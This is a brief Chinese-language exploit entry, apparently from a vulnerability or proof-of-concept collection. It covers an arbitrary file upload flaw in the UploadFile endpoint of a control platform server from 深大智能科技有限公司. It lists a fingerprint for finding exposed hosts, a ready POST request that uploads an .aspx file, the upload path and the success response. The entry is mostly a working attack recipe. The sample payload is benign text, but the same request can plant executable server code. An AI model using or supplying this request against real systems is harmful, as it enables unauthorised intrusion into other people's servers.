# 深大智能科技有限公司管控平台服务端UploadFile存在任意文件上传漏洞

深大智能科技有限公司管控平台服务端 ｜ 文件上传 ｜ —
- **指纹**：`body="ItemsControlServer.aspx"`
- **请求**：`POST /Launch/UploadFile?FileName=2.aspx&Version=1&Size=100 HTTP/1.1`

**Payload**
```
123
上传定位：/Launch/Client/2.aspx
```
- **响应特征**：200 true